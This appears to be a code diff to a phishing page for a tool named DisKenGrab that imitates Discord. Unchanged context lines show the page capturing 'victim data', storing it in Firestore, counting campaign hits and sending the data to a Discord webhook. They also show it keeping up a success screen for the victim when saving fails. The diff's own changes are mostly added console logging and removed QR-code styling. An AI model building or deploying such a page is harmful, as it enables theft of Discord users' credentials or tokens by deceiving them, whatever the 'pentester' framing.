@@ -164,30 +164,6 @@
             font-size: 14px;
             margin-top: 15px;
         }
-
-        .qr-section {
-            text-align: center;
-            margin-bottom: 20px;
-            padding: 20px;
-            background: var(--discord-darker);
-            border-radius: 8px;
-        }
-
-        .qr-placeholder {
-            width: 200px;
-            height: 200px;
-            background: #40444b;
-            margin: 0 auto 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 8px;
-        }
-
-        .qr-placeholder i {
-            font-size: 3rem;
-            color: var(--text-muted);
-        }
     </style>
 </head>
 <body>
@@ -245,6 +221,8 @@
         const attackId = urlParams.get('id');
         const pentesterId = urlParams.get('pentester');
 
+        console.log('🔗 Attack Page Parameters:', { attackId, pentesterId });
+
         // Initialize Firebase
         let db;
         if (typeof firebaseConfig !== 'undefined') {
@@ -254,7 +232,7 @@
                     firebase.initializeApp(firebaseConfig);
                 }
                 db = firebase.firestore();
-               console.log('✅ Attack page Firebase initialized for campaign:', attackId);
+                console.log('✅ Attack page Firebase initialized');
             } catch (error) {
                 console.error('❌ Firebase initialization error:', error);
             }
@@ -308,6 +286,7 @@
                         capturedAt: firebase.firestore.FieldValue.serverTimestamp(),
                         status: 'captured'
                     });
+                    console.log('✅ Victim data saved to Firestore');
 
                     // Update campaign stats
                     if (attackId) {
@@ -316,6 +295,8 @@
 
                     // Send to Discord webhook if configured
                     await sendToWebhook(victimData);
+                } else {
+                    console.log('⚠️ Firestore not available, data not saved');
                 }
 
                 // Show success and redirect
@@ -328,7 +309,7 @@
                 }, 3000);
 
             } catch (error) {
-                console.error('Error capturing data:', error);
+                console.error('❌ Error capturing data:', error);
                 // Even if saving fails, still show success to the victim
                 successDiv.style.display = 'block';
                 redirectNotice.style.display = 'block';
@@ -365,9 +346,10 @@
                         hits: currentHits + 1,
                         lastHit: firebase.firestore.FieldValue.serverTimestamp()
                     });
+                    console.log('✅ Campaign stats updated');
                 }
             } catch (error) {
-                console.error('Error updating campaign stats:', error);
+                console.error('❌ Error updating campaign stats:', error);
             }
         }
 
@@ -429,19 +411,20 @@
                                     embeds: [embed] 
                                 })
                             });
+                            console.log('✅ Webhook notification sent');
                         }
                     }
                 }
             } catch (error) {
-                console.error('Error sending webhook:', error);
+                console.error('❌ Error sending webhook:', error);
             }
         }
 
         // Initialize the attack page
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('DisKenGrab Attack Page Loaded');
-            console.log('Attack ID:', attackId);
-            console.log('Pentester ID:', pentesterId);
+            console.log('🚀 DisKenGrab Attack Page Loaded');
+            console.log('📊 Attack ID:', attackId);
+            console.log('👤 Pentester ID:', pentesterId);
             
             // Add some realistic delay to mimic Discord's loading
             setTimeout(() => {
